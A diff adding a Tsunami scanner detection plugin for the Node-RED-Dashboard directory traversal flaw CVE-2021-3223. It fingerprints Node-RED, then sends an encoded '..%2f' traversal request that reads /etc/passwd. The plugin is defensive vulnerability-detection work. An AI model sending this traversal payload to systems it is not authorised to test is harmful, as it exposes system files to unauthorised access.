@@ -1,0 +1,82 @@
+# proto-file: proto/templated_plugin.proto
+# proto-message: TemplatedPlugin
+
+###############
+# PLUGIN INFO #
+###############
+
+info: {
+  type: VULN_DETECTION
+  name: "NodeRed_CVE_2021_3223"
+  author: 
+    "Robert Dick (robert@doyensec.com) for the Templated version, "
+    "Tsunami Team (tsunami-dev@google.com) for the original Java version"
+  version: "2.0"
+}
+
+finding: {
+  main_id: {
+    publisher: "GOOGLE"
+    value: "CVE_2021_3223"
+  }
+  title: "Node-RED-Dashboard directory traversal vulnerability (CVE-2021-3223)"
+  description: "Directory Traversal vulnerability in exposed Node-RED-Dashboard"
+  recommendation: "Upgrade node-red-dashboard to version 2.26.2 or greater."
+  severity: CRITICAL
+  related_id: {
+    publisher: "CVE"
+    value: "CVE-2021-3223"
+  }
+}
+
+###########
+# ACTIONS #
+###########
+
+# one step to check for /etc/passwd, changed from original detector 
+# because the original detector did not work correctly.
+
+actions: {
+  name: "fingerprint_nodered"
+  http_request: {
+    method: GET
+    uri: "/"
+    response: {
+      http_status: 200
+      expect_any: {
+        conditions: [
+          { body: {} contains: "<title>Node-RED</title>" }
+        ]
+      }
+    }
+  }
+}
+
+
+actions: {
+  name: "check_traversal"
+  http_request: {
+    method: GET
+    uri: "/ui_base/js/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd"
+    response: {
+      http_status: 200
+      expect_any: {
+        conditions: [
+          { body: {} contains: "root:x:0:0" },
+          { body: {} contains: "root:*:0:0" }
+        ]
+      }
+    }
+  }
+}
+
+#############
+# WORKFLOWS #
+#############
+
+workflows: {
+  actions: [
+    "fingerprint_nodered",
+    "check_traversal"
+  ]
+}
